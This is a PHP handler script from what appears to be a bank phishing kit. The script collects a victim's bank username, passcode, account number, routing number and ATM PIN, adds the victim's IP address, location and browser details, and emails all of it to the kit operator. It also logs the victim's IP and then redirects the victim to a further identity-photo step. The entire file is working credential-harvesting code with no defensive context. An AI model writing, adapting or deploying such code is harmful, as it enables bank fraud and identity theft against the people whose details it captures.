<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['bankname'] == "") {
	exit();
}
$ip = getUserIP(); 
$message  = "#--------------------[ BANK LOGIN ]-------------------------#\n";
$message .= "Bank Name		: ".$_POST['bankname']."\n";
$message .= "Account Username	: ".$_POST['userid']."\n";
$message .= "Passcode	: ".$_POST['passcode']."\n";
$message .= "Account Number	: ".$_POST['accnum']."\n";
$message .= "Routing Number	: ".$_POST['rnumber']."\n";
$message .= "ATM PIN	: ".$_POST['atmpin']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$subject = "BANK ACCOUNT: ".$_POST['bankname']." [ $cn - $os - $ip ]";
kirim_mail($setting['email_result'], $_SESSION['from'], $subject, $message);
tulis_file("../result/total_bank.txt", $ip);

if($setting['get_photo'] == "on"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
 echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}